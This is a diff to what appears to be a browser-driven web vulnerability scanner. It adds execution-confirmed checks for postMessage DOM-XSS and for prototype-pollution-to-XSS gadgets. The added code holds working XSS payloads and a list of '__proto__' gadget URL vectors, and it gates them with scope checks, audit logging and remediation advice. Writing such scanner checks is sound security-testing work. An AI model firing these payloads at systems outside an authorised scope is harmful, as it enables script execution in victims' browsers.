@@ -255,7 +255,10 @@ def run(scope: Scope, seeds: List[str], param_urls: List[str], cfg: Config,
                 if base in cpp_seen or not scope.url_in_scope(base):
                     continue
                 cpp_seen.add(base)
-                finding = _clientpp_finding(page, scope, base, audit)
+                # prefer the stronger execution-confirmed PP→XSS gadget chain; fall
+                # back to the writable-prototype finding when no gadget executes.
+                finding = _clientpp_gadget(page, scope, base, audit) or \
+                    _clientpp_finding(page, scope, base, audit)
                 if finding:
                     findings.append(finding)
                 if spacing:
@@ -379,6 +382,29 @@ def _analyze_listener(src: str) -> Tuple[str, str]:
     return "", ""
 
 
+# payload shapes tried when actively confirming a postMessage handler: handlers
+# variously read event.data as a raw string or pull a property off a JSON object.
+_PM_DATA_KEYS = ("html", "content", "message", "msg", "data", "body", "text", "value")
+
+
+def _pm_active_confirm(page) -> bool:
+    """Actively drive the page's OWN message handlers with an XSS payload via
+    window.postMessage and check the execution sentinel. EXECUTION is the oracle,
+    so a True here upgrades the static finding to confirmed with zero FP. Tries a
+    raw-string payload and several common JSON-property shapes."""
+    t = _tok()
+    onerr = "<img src=x onerror=__rcxss('%s')>" % t
+    shapes = [onerr] + [{k: onerr} for k in _PM_DATA_KEYS]
+    try:
+        for shape in shapes:
+            page.evaluate("(p)=>{ try{ window.postMessage(p,'*'); }catch(e){} }", shape)
+        page.wait_for_timeout(400)
+        hits = page.evaluate("window.__rc_hits || []")
+        return any(t in h for h in hits)
+    except Exception:
+        return False
+
+
 def _postmessage_findings(page, url: str, seen: set) -> List[Finding]:
     out: List[Finding] = []
     try:
@@ -394,6 +420,23 @@ def _postmessage_findings(page, url: str, seen: set) -> List[Finding]:
             continue
         seen.add(key)
         snippet = re.sub(r"\s+", " ", (src or "").strip())[:160]
+        # try to PROVE it by actually driving the handler to execute script
+        confirmed = sev == "high" and _pm_active_confirm(page)
+        if confirmed:
+            out.append(Finding(
+                title=f"postMessage XSS confirmed (origin-less handler → {sink}, executed)",
+                severity="high", category="xss", target=url,
+                evidence=(
+                    f"A window 'message' listener on {url} feeds event.data into {sink} "
+                    f"with no event.origin check. Posting a crafted message to the page "
+                    f"executed our payload (sentinel fired) — execution-confirmed DOM-XSS "
+                    f"drivable by ANY page that frames/opens this one. Handler: `{snippet}`"),
+                recommendation=("Validate event.origin against an allowlist at the top of the "
+                                "handler and never feed event.data into HTML/JS sinks."),
+                confidence="confirmed",
+                poc=("// from an attacker page that opened/framed the target:\n"
+                     "win.postMessage(\"<img src=x onerror=alert(document.domain)>\", \"*\")")))
+            continue
         out.append(Finding(
             title=f"postMessage handler without origin check → {sink}",
             severity=sev, category="xss", target=url,
@@ -446,6 +489,62 @@ def _clientpp_finding(page, scope, base_url: str, audit):
                 recommendation=("Don't recursively merge/assign untrusted URL data into objects; "
                                 "block `__proto__`/`constructor`/`prototype` keys, use Map or "
                                 "Object.create(null), and freeze critical prototypes."),
+                confidence="confirmed",
+                poc=f"open in a browser: {target}")
+    return None
+
+
+# PP→XSS gadget vectors: pollute a property a popular library later reads into an
+# HTML/script sink, with a payload that fires the execution sentinel. If the page's
+# libraries contain the gadget, the payload runs — execution-confirmed PP→XSS.
+_PP_GADGETS = [
+    "?__proto__[innerHTML]=<img src=x onerror=__rcxss('{T}')>",
+    "?__proto__[srcdoc]=<svg onload=__rcxss('{T}')>",
+    "?__proto__[src]=x onerror=__rcxss('{T}')",
+    "?__proto__[value]=<img src=x onerror=__rcxss('{T}')>",
+    "?__proto__[content]=<img src=x onerror=__rcxss('{T}')>",
+    "#__proto__[innerHTML]=<img src=x onerror=__rcxss('{T}')>",
+]
+
+
+def _clientpp_gadget(page, scope, base_url: str, audit):
+    """Execution-confirmed prototype-pollution → DOM XSS: navigate a URL that both
+    pollutes Object.prototype AND carries an XSS payload in a gadget property; if a
+    library on the page reads that property into a sink, the sentinel fires. No
+    execution → no finding (zero FP), so this is silent unless a real gadget exists."""
+    for vec in _PP_GADGETS:
+        t = _tok()
+        target = base_url + vec.replace("{T}", t)
+        if not scope.url_in_scope(target.split("#")[0]):
+            continue
+        if audit:
+            audit.record("GET", target, phase="browser")
+        try:
+            page.goto(target, wait_until="load")
+            page.wait_for_timeout(500)
+            hits = page.evaluate("window.__rc_hits || []")
+        except Exception:
+            continue
+        if any(t in h for h in hits):
+            try:
+                page.evaluate("()=>{ for(const k of ['innerHTML','srcdoc','src','value','content'])"
+                              "{ try{ delete Object.prototype[k]; }catch(e){} } }")
+            except Exception:
+                pass
+            return Finding(
+                title="Prototype pollution → DOM XSS via gadget (execution-confirmed)",
+                severity="critical", category="exploit", target=target,
+                evidence=(
+                    "a single URL that pollutes Object.prototype AND supplies an HTML "
+                    "payload in a gadget property caused the page's own libraries to "
+                    "execute script (sentinel fired). This is a full client-side "
+                    "prototype-pollution → XSS chain proven end-to-end in a real browser, "
+                    "not a writable-prototype guess."),
+                recommendation=("Block __proto__/constructor/prototype keys in any "
+                                "URL/JSON merge, use Map/Object.create(null), freeze "
+                                "critical prototypes, and upgrade libraries with known "
+                                "PP gadgets. A strict CSP forbidding inline script also "
+                                "breaks the gadget."),
                 confidence="confirmed",
                 poc=f"open in a browser: {target}")
     return None
